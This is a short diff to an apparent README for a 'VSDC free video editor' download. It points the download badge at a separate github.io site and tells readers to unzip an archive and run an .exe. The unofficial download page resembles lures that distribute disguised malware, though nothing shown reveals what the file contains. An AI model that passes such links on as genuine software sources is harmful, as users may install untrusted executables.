@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://vsdc-free-video-editor-download.github.io/.github/)
 
 ## 📸 Overview
 ![vsdc-free-editor-multitrack](https://github.com/user-attachments/assets/ce0f081d-39ce-4006-8fc8-b9ce0b4a2965)
